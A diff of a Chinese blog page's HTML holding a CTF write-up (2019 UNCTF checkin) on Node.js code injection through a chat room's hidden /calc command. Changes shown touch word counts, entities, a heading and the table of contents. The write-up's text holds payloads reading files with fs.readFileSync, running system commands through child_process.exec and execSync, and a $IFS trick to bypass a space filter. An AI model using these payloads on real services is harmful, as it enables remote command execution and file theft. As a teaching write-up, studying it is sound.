@@ -277,7 +277,7 @@
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">字数统计:</span>
-           <span class="post-count">329(字)</span>
+           <span class="post-count">337(字)</span>
            
          </span>
 	  
@@ -322,8 +322,8 @@
 
       
         <h3 id="Node-js是一个Javascript运行环境-runtime-environment-Node-js不是一个JavaScript框架-Node-js是一个让JavaScript运行在服务端的开发平台，它让JavaScript成为与PHP、Python、Perl、Ruby-等服务端语言平起平坐的脚本语言。"><a href="#Node-js是一个Javascript运行环境-runtime-environment-Node-js不是一个JavaScript框架-Node-js是一个让JavaScript运行在服务端的开发平台，它让JavaScript成为与PHP、Python、Perl、Ruby-等服务端语言平起平坐的脚本语言。" class="headerlink" title="Node.js是一个Javascript运行环境(runtime environment),Node.js不是一个JavaScript框架,Node.js是一个让JavaScript运行在服务端的开发平台，它让JavaScript成为与PHP、Python、Perl、Ruby 等服务端语言平起平坐的脚本语言。"></a>Node.js是一个Javascript运行环境(runtime environment),Node.js不是一个JavaScript框架,Node.js是一个让JavaScript运行在服务端的开发平台，它让JavaScript成为与PHP、Python、Perl、Ruby 等服务端语言平起平坐的脚本语言。</h3><a id="more"></a>
-<p>进入之后是一个聊天室.<br>查看源码app.03bc1faf.js，这个JS文件里有/help、/more、/calc、/name、/flag、/clear</p>
-<p>但是/calc，输入/help不提醒，而且可以进行运算。</p>
+<p>进入之后是一个聊天室.<br>查看源码app.03bc1faf.js，这个JS文件里有&#x2F;help、&#x2F;more、&#x2F;calc、&#x2F;name、&#x2F;flag、&#x2F;clear</p>
+<p>但是&#x2F;calc，输入&#x2F;help不提醒，而且可以进行运算。</p>
 <img src="/2019/11/20/2019UNCTF-checkin/1.png" class="">
 
 <p>调用calc函数</p>
@@ -333,8 +333,7 @@
 <h1 id="nodejs注入"><a href="#nodejs注入" class="headerlink" title="nodejs注入"></a>nodejs注入</h1><h2 id="执行JavaScript命令"><a href="#执行JavaScript命令" class="headerlink" title="执行JavaScript命令"></a>执行JavaScript命令</h2><p><code>payload: ?input=console.log(&#39;hello&#39;)</code></p>
 <p>运行rce.js，在浏览器中输入payload，可以看到控制台中输出了“hello”，说明我们的命令被成功执行了：<br>#</p>
 <h2 id="使用fs模块读取文件"><a href="#使用fs模块读取文件" class="headerlink" title="使用fs模块读取文件"></a>使用fs模块读取文件</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">rec</span>.js目录下放置了一个flag.txt。</span><br><span class="line"></span><br><span class="line">payload:?input=res.<span class="keyword">end</span>(require('fs').read<span class="constructor">FileSync('.<span class="operator">/</span><span class="params">flag</span>.<span class="params">txt</span>')</span>.<span class="keyword">to</span><span class="constructor">String()</span>)</span><br><span class="line"></span><br><span class="line">浏览器窗口中输出了flag.txt的内容：</span><br></pre></td></tr></table></figure>
-<p>#</p>
-<h2 id="使用child-process模块执行系统命令"><a href="#使用child-process模块执行系统命令" class="headerlink" title="使用child_process模块执行系统命令"></a>使用child_process模块执行系统命令</h2><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload:?<span class="built_in">input</span>=<span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">'calc'</span>)</span><br><span class="line"></span><br><span class="line">成功弹出了计算器：</span><br><span class="line"></span><br><span class="line">payload:http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8888</span>/?<span class="built_in">input</span>=<span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">'mkdir test'</span>)</span><br><span class="line"></span><br><span class="line">成功创建了一个名叫“test”的目录：</span><br></pre></td></tr></table></figure>
+<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="使用child-process模块执行系统命令"><a href="#使用child-process模块执行系统命令" class="headerlink" title="使用child_process模块执行系统命令"></a>使用child_process模块执行系统命令</h2><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload:?<span class="built_in">input</span>=<span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">'calc'</span>)</span><br><span class="line"></span><br><span class="line">成功弹出了计算器：</span><br><span class="line"></span><br><span class="line">payload:http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8888</span>/?<span class="built_in">input</span>=<span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">'mkdir test'</span>)</span><br><span class="line"></span><br><span class="line">成功创建了一个名叫“test”的目录：</span><br></pre></td></tr></table></figure>
 <h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>调用child_process模块执行命令，题目过滤了空格，用$IFS替代空格</p>
 <p>IFS，Linux叫做内部字段分隔符<br>#</p>
 <h3 id="模仿上面方法"><a href="#模仿上面方法" class="headerlink" title="模仿上面方法"></a>模仿上面方法</h3><p>payload:<br><code>/calc require(&quot;child_process&quot;).execSync(&quot;ls$IFS/&quot;).toString()</code></p>
@@ -406,7 +405,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Node-js是一个Javascript运行环境-runtime-environment-Node-js不是一个JavaScript框架-Node-js是一个让JavaScript运行在服务端的开发平台，它让JavaScript成为与PHP、Python、Perl、Ruby-等服务端语言平起平坐的脚本语言。"><span class="nav-number">1.</span> <span class="nav-text">Node.js是一个Javascript运行环境(runtime environment),Node.js不是一个JavaScript框架,Node.js是一个让JavaScript运行在服务端的开发平台，它让JavaScript成为与PHP、Python、Perl、Ruby 等服务端语言平起平坐的脚本语言。</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#nodejs注入"><span class="nav-number"></span> <span class="nav-text">nodejs注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#执行JavaScript命令"><span class="nav-number"></span> <span class="nav-text">执行JavaScript命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用fs模块读取文件"><span class="nav-number"></span> <span class="nav-text">使用fs模块读取文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用child-process模块执行系统命令"><span class="nav-number"></span> <span class="nav-text">使用child_process模块执行系统命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#原理"><span class="nav-number"></span> <span class="nav-text">原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#模仿上面方法"><span class="nav-number">1.</span> <span class="nav-text">模仿上面方法</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Node-js是一个Javascript运行环境-runtime-environment-Node-js不是一个JavaScript框架-Node-js是一个让JavaScript运行在服务端的开发平台，它让JavaScript成为与PHP、Python、Perl、Ruby-等服务端语言平起平坐的脚本语言。"><span class="nav-number">1.</span> <span class="nav-text">Node.js是一个Javascript运行环境(runtime environment),Node.js不是一个JavaScript框架,Node.js是一个让JavaScript运行在服务端的开发平台，它让JavaScript成为与PHP、Python、Perl、Ruby 等服务端语言平起平坐的脚本语言。</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#nodejs注入"><span class="nav-number"></span> <span class="nav-text">nodejs注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#执行JavaScript命令"><span class="nav-number"></span> <span class="nav-text">执行JavaScript命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用fs模块读取文件"><span class="nav-number"></span> <span class="nav-text">使用fs模块读取文件</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#"><span class="nav-number"></span> <span class="nav-text"></span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#使用child-process模块执行系统命令"><span class="nav-number"></span> <span class="nav-text">使用child_process模块执行系统命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#原理"><span class="nav-number"></span> <span class="nav-text">原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#模仿上面方法"><span class="nav-number">1.</span> <span class="nav-text">模仿上面方法</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -422,7 +421,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">94</span>
+          <span class="site-state-item-count">95</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -494,7 +493,7 @@
 <div class="copyright">
   
   &copy; 2018 – 
-  <span itemprop="copyrightYear">2023</span>
+  <span itemprop="copyrightYear">2024</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
